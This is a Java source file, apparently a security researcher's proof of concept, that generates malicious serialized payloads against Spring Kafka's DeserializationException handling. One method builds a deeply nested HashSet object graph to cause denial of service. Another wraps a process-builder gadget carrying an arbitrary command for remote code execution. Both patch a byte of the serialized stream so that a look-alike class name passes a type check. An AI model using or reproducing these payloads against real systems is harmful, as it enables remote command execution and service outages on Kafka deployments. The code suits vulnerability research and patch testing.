package com.contrast;

import com.contrast.gadget.ProcBuilder;
import org.springframework.kafka.listener.ListenerUtils;
import xrg.springframework.kafka.support.serializer.DeserializationException;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.HashSet;
import java.util.Set;

public class PayloadGenerator {



    public static byte[] getDOSPayload() throws IOException {
        byte[] data = serialize(new DeserializationException(payload()));
        // this changes the fully qualified name of the root class from
        // xrg.springframework.kafka.supporter.serializer.DeserializationException
        // to
        // org.springframework.kafka.supporter.serializer.DeserializationException
        // so that it matches the expected class name and bypasses the check.
        data[8] = "o".getBytes()[0];
        return data;
    }

    private static Set payload() throws IOException {
        Set root = new HashSet();
        Set s1 = root;
        Set s2 = new HashSet();
        for (int i = 0; i < 100; i++) {
            Set t1 = new HashSet();
            Set t2 = new HashSet();
            t1.add("foo"); // make it not equal to t2
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }
        return root;
    }

    private static byte[] serialize(Object o) throws IOException {
        ByteArrayOutputStream ba = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(ba);
        oos.writeObject(o);
        oos.close();
        return ba.toByteArray();
    }


    public static byte[] getRCEPayload(String s) throws IOException {
        ProcBuilder builder = new ProcBuilder();
        new DeserializationException(payload());
        builder.addCommandInNotBeanStandardWay(s);
        DeserializationException exception = new DeserializationException(builder);
        byte[] data = serialize(exception);
        // this changes the fully qualified name of the root class from
        // xrg.springframework.kafka.supporter.serializer.DeserializationException
        // to
        // org.springframework.kafka.supporter.serializer.DeserializationException
        // so that it matches the expected class name and bypasses the check.
        data[8] = "o".getBytes()[0];
        return data;
    }
}
